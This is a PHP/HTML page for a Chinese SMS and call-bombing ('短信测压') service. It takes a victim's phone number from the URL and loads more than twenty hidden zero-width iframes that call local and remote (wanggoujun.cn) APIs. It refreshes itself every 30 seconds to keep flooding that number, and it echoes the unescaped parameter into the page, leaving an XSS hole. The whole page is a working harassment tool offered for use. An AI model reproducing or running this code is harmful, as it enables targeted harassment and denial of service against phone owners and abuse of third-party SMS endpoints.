﻿<!DOCTYPE HTML>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name='referrer' content="never">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta http-equiv="cache-control" content="no-siteapp">
<title>多开线路测压-增强版</title>
<meta name="keywords" content="木槿网络，木槿云短信测压,源码开发请联系QQ号1773511693">
<meta name="description" content="免费接口更新请访问www.wanggoujun.cn,QQ号1773511693">
<link rel="shortcut icon" href="www.wanggoujun.cn/content/templates/vip_dux/favicon.ico">
</head>
<body>

<!--开始-->
</div> 
<div align="center"> 
<h2 id="r1"><span style="color: rgb(0, 179, 255);">短</span><span style="color: rgb(0, 83, 255);">信</span><span style="color: rgb(12, 0, 255);">云</span><span style="color: rgb(108, 0, 255);">呼</span><span style="color: rgb(204, 0, 255);">多</span><span style="color: rgb(255, 0, 211);">开</span><span style="color: rgb(255, 0, 115);">模</span><span style="color: rgb(255, 0, 20);">式</span><span style="color: rgb(255, 76, 0);">测</span><span style="color: rgb(255, 172, 0);">压</span></h2> 
</div>
<br>

<b>正在为该号进行云呼中...</b>
<p>本页为多开模式，自动刷新轰炸</p>
<p>若需要停止轰炸，请直接将此页面关闭即可</p>
<p>若需要一直不断轰炸，请勿关闭此页面</p><br>
<meta http-equiv="refresh" content="30.1;url=d.php?hm=<?php echo $_GET['hm'];?>">
<iframe src="http://www.wanggoujun.cn/index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="http://www.wanggoujun.cn/api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="index.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
<iframe src="api.php?hm=<?php echo $_GET['hm'];?>" width="0"></iframe>
</div>
<br>
<a href="./" target=_blank>点击返回首页访问</a>
</div>
  <style>
    html,body{
      height: 100vh;
      width: 100vw;
      margin: 0;
      padding: 0;
      background: #ffffff;
      text-align: center;
      margin-top:30px;
      overflow: hidden;
    }
    *{
      color:rgb(100,100,100);
    }
    a{
      color:#42b983;
    }
    ul,li{
      margin: 0;
    }
    ul{
      margin-left: -40px;
      line-height: 30px;
    }
    li{
      list-style: none;
    }
  </style>
<!--结束-->
         <?php echo $aik['tongji'];?>
</body>
</html>
